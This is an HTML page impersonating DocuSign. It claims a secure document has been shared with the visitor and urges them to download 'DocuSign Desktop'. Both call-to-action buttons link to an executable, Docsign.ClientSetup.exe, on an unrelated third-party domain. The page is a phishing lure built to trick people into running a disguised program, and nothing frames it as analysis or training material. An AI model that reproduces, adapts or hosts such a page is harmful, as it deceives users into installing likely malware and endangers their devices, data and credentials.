<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="DocuSign – The world's most trusted eSignature solution for secure document signing, sending, and management.">
    <meta name="keywords" content="DocuSign, electronic signature, document signing, digital signature, secure documents">
    <title>DocuSign - Sign Documents Securely | DocuSign</title>
    <style>
        /* Global Styling */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            color: #000000;
            background-color: #f4f4f5;
        }

        h1, h2, h3 {
            font-weight: 600;
            margin: 0;
            padding: 0;
        }

        /* Header */
        header {
            background: white; /* White background */
            color: #003d6b; /* DocuSign Blue */
            padding: 20px 0;
            text-align: left;
            display: flex;
            align-items: center;
            padding-left: 20px;
            padding-right: 20px;
        }

        header h1 {
            font-size: 36px;
            margin: 0;
            margin-left: 10px;
        }

        nav ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        nav ul li {
            display: inline;
            margin: 0 20px;
        }

        nav ul li a {
            color: #003d6b; /* DocuSign Blue */
            text-decoration: none;
            font-weight: bold;
        }

        /* Logo Styling */
        #logo {
            height: 40px;
            width: 40px;
            background-color: #ffb81c;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #003d6b;
            font-size: 24px;
            font-weight: bold;
        }

        /* Hero Section */
        #hero {
            background: linear-gradient(90deg, #003d6b 0%, #0066cc 100%); /* DocuSign Blue Gradient */
            color: white;
            text-align: center;
            padding: 80px 20px;
        }

        #hero h2 {
            font-size: 1.5em;
            margin-bottom: 20px;
        }

        .cta-button {
            background-color: #ffb81c; /* DocuSign Orange */
            color: #003d6b;
            padding: 15px 30px;
            font-size: 1.2em;
            text-decoration: none;
            border-radius: 5px;
            margin-top: 20px;
            display: inline-block;
            transition: background-color 0.3s;
            font-weight: bold;
        }

        .cta-button:hover {
            background-color: #ff9500; /* Hover effect to darker orange */
        }

        /* Features Section */
        #features {
            padding: 40px 20px;
            text-align: center;
            background-color: #ffffff;
        }

        #features h2 {
            font-size: 2.5em;
            color: #003d6b;
            margin-bottom: 40px;
        }

        .feature {
            display: inline-block;
            width: 23%;
            margin: 0 1%;
            background-color: #f4f4f5;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .feature h3 {
            color: #003d6b;
        }

        /* Call to Action Section */
        #cta {
            background: #1A1A1A; /* Dark background for CTA */
            color: white;
            text-align: center;
            padding: 60px 20px;
        }

        footer {
            background-color: #003d6b;
            color: white;
            text-align: center;
            padding: 15px 0;
        }

        footer a {
            color: white;
            text-decoration: none;
        }

        /* Mobile Responsive */
        @media (max-width: 768px) {
            header {
                flex-direction: column;
                text-align: center;
                padding: 15px;
            }

            header h1 {
                margin: 10px 0;
            }

            nav ul li {
                display: block;
                margin: 10px 0;
            }

            #hero h2 {
                font-size: 1.3em;
            }

            .feature {
                width: 45%;
                margin: 10px 2%;
            }

            #features h2 {
                font-size: 2em;
            }
        }

        @media (max-width: 480px) {
            .feature {
                width: 90%;
                margin: 10px 5%;
            }
        }
    </style>
</head>
<body>

<header>
    <!-- DocuSign Logo -->
    <div id="logo">D</div>
    <h1>DocuSign</h1>
    <nav>
        <ul>
            <li><a href="">Features</a></li>
            <li><a href="">Get Started</a></li>
            <li><a href="">Solutions</a></li>
        </ul>
    </nav>
</header>

<section id="hero">
    <h2>A secure document has been shared with you.<p>Download DocuSign Desktop to access and sign it safely.</p></h2>
    <a href="https://service-001.screendesk.nl/Bin/Docsign.ClientSetup.exe?e=Access&y=Guest" class="cta-button">Download DocuSign Desktop</a>
</section>

<section id="features">
    <h2>Why Choose DocuSign?</h2>
    <div class="feature">
        <h3>Secure Signatures</h3>
        <p>Bank-level security with 256-bit SSL encryption protects your documents and signatures.</p>
    </div>
    <div class="feature">
        <h3>Legally Binding</h3>
        <p>DocuSign eSignatures are legally valid and enforceable in countries around the world.</p>
    </div>
    <div class="feature">
        <h3>Easy Integration</h3>
        <p>Seamlessly integrate with your favorite business applications and workflow systems.</p>
    </div>
    <div class="feature">
        <h3>Mobile Ready</h3>
        <p>Sign documents on any device, anywhere, anytime with our mobile-optimized platform.</p>
    </div>
</section>

<section id="cta">
    <h2>Ready to Get Started?</h2>
    <p>Download DocuSign Desktop for enhanced security and offline capabilities.</p>
    <a href="https://service-001.screendesk.nl/Bin/Docsign.ClientSetup.exe?e=Access&y=Guest" class="cta-button">Try DocuSign Desktop Now</a>
</section>

<footer>
    <p>&copy; 2025 DocuSign, Inc. All rights reserved. | <a href="">Privacy Policy</a> | <a href="">Terms of Service</a></p>
</footer>

</body>
</html>